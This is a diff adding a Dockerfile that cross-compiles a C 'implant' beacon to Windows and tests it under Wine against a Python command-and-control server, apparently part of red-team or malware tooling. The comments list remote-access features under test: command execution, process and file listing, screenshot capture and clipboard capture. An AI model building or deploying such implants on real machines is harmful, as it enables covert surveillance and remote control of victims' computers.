@@ -1,0 +1,107 @@
+# Dockerfile.windows-test
+#
+# Cross-compiles the C implant to a Windows .exe and runs it under Wine
+# against a Python C2, testing that Windows code paths work correctly.
+#
+# Build:  docker build -f docker/Dockerfile.windows-test -t c2-wintest .
+# Run:    docker run --rm c2-wintest
+#
+# What it tests:
+#   - C implant registers with C2
+#   - execute, sysinfo, ps, ls tasks return results
+#   - Screenshot (PowerShell GDI path fires, even if no display)
+#   - Clipboard (PowerShell path fires, even if empty)
+#
+# macOS testing via Docker is NOT possible (Apple EULA forbids macOS in
+# Docker on Linux). For macOS, trust the #ifdef guards + syntax checks.
+
+FROM ubuntu:24.04
+
+ENV DEBIAN_FRONTEND=noninteractive
+ENV WINEDEBUG=-all
+ENV WINEPREFIX=/root/.wine
+
+# Install all tools in one layer to keep the image lean
+RUN apt-get update && apt-get install -y \
+    # Cross-compiler
+    gcc-mingw-w64-x86-64 \
+    # Windows binary runner
+    wine \
+    wine64 \
+    # Python 3 for running the C2
+    python3 \
+    python3-pip \
+    python3-venv \
+    # Utilities
+    wget \
+    unzip \
+    openssl \
+    ca-certificates \
+    && rm -rf /var/lib/apt/lists/*
+
+# Install Python deps for the C2
+RUN pip3 install --break-system-packages flask requests cryptography
+
+# Download pre-built libcurl for Windows (mingw-w64 edition)
+# Using curl's official Windows builds from GitHub releases
+ARG CURL_VERSION=8.10.1_1
+RUN wget -q "https://github.com/curl/curl/releases/download/curl-$(echo ${CURL_VERSION} | tr _ -)/curl-${CURL_VERSION}-win64-mingw.zip" \
+    -O /tmp/curl-win.zip 2>/dev/null \
+    || wget -q "https://curl.se/windows/dl-${CURL_VERSION}/curl-${CURL_VERSION}-win64-mingw.zip" \
+    -O /tmp/curl-win.zip \
+    && unzip -q /tmp/curl-win.zip -d /tmp/curl-win \
+    && CURL_DIR=$(ls /tmp/curl-win/) \
+    && cp -r /tmp/curl-win/$CURL_DIR/include/curl /usr/x86_64-w64-mingw32/include/ \
+    && cp /tmp/curl-win/$CURL_DIR/lib/libcurl.dll.a /usr/x86_64-w64-mingw32/lib/ \
+    && mkdir -p /opt/curl-dlls \
+    && cp /tmp/curl-win/$CURL_DIR/bin/*.dll /opt/curl-dlls/ \
+    && rm -rf /tmp/curl-win /tmp/curl-win.zip
+
+WORKDIR /build
+
+# Copy the source files needed
+COPY implant_beacon.c ./
+COPY Makefile ./
+COPY ../C2/ca.crt     ./ca.crt
+COPY ../C2/c2.crt     ./c2.crt
+COPY ../C2/c2.key     ./c2.key
+
+# Generate self-signed certs if not found (for standalone testing)
+RUN if [ ! -f ca.crt ]; then \
+    openssl req -x509 -newkey rsa:2048 -keyout ca.key -out ca.crt -days 3650 -nodes \
+        -subj "/CN=TestCA" 2>/dev/null; \
+    openssl req -newkey rsa:2048 -keyout c2.key -out c2.csr -nodes \
+        -subj "/CN=C2Client" 2>/dev/null; \
+    openssl x509 -req -in c2.csr -CA ca.crt -CAkey ca.key -CAcreateserial \
+        -out c2.crt -days 3650 2>/dev/null; \
+    fi
+
+# Cross-compile to Windows .exe
+# Embed certs as strings at compile time so the .exe is self-contained
+RUN CA_CERT=$(awk 'NF{printf "%s\\n", $0}' ca.crt) && \
+    CLIENT_CERT=$(awk 'NF{printf "%s\\n", $0}' c2.crt) && \
+    CLIENT_KEY=$(awk 'NF{printf "%s\\n", $0}' c2.key) && \
+    x86_64-w64-mingw32-gcc -Wall -O2 \
+        -DC2_URL_0='"https://host.docker.internal:9447"' \
+        -DDEFAULT_INTERVAL=2 \
+        -DJITTER_FACTOR=0.0 \
+        -DCA_CERT="\"${CA_CERT}\"" \
+        -DCLIENT_CERT="\"${CLIENT_CERT}\"" \
+        -DCLIENT_KEY="\"${CLIENT_KEY}\"" \
+        -I/usr/x86_64-w64-mingw32/include \
+        -o implant_beacon.exe \
+        implant_beacon.c \
+        -L/usr/x86_64-w64-mingw32/lib \
+        -lcurl \
+        -lssl -lcrypto \
+        -lws2_32 -lwinhttp -lncrypt -lcrypt32 \
+        -lpthread \
+    && echo "[+] Cross-compiled to implant_beacon.exe"
+
+# Copy curl DLLs next to the .exe so Wine can find them
+RUN cp /opt/curl-dlls/*.dll /build/
+
+# Copy test script
+COPY docker/test_windows.py ./
+
+CMD ["python3", "test_windows.py"]
